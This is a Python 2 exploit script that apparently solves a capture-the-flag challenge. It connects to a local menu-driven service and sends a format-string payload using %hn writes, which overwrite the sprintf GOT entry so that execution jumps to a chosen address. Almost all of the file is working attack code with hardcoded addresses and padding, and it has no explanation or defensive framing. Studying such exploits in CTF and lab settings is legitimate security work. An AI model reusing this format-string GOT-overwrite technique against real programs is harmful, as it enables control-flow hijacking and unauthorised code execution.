#!/usr/bin/env python
import sys
import struct
from socket import socket
import IPython

s = socket()
s.connect(('localhost', int(sys.argv[1])))

def recv_until(s, endmsg):
    msg = ''
    while True:
        part = s.recv(2048);
        #print part,
        msg += part
        if part.find(endmsg) >= 0:
            break
    if msg.find('CRAZY') >= 0:
        print 'stop'
        #raw_input()
    return msg

msg = recv_until(s, 'Your choice: ')
print 'COMPLETE'
print msg
print 'YOUR TURN'
s.send('1\n')

msg = recv_until(s, 'Insert name: ')
print 'COMPLETE'
print msg
print 'YOUR TURN'

target = 0x8049232 # where I want to jump
sprintf_got = 0x804c060 # what I have to overwrite

# 0x804 ~> 2052
#first_num = 2044
#second_num = 37426 - 2044 = 35382

sprintf_got = 0x804c060

first_target = struct.pack('I', sprintf_got+2)
second_target = struct.pack('I', sprintf_got)


fs = first_target + second_target + '%70$2044x%22$hn%70$35354x%23$hn'

padding = 'A' * (100 - len(fs))

s.send(fs + padding + '\x02\x02\x02\x02\x02\x02\x02\x02\xff\xff' +'\n')
#s.send('%s' * 1 + '%x'*(50-1) + '\x02\x02\x02\x02\x02\x0' +'\n')
#s.send('A'*10 + '\n')


msg = recv_until(s, 'Your choice: ')
print 'COMPLETE'
print msg
print 'YOUR TURN'
s.send('3\n')

msg = recv_until(s, 'Insert plant ID: ')
print 'COMPLETE'
print msg
print 'YOUR TURN'
s.send('10\n')

#msg = recv_until(s, 'Your choice: ')
#print 'COMPLETE'
#print msg
#print 'YOUR TURN'
#s.send('3\n')
s.close()
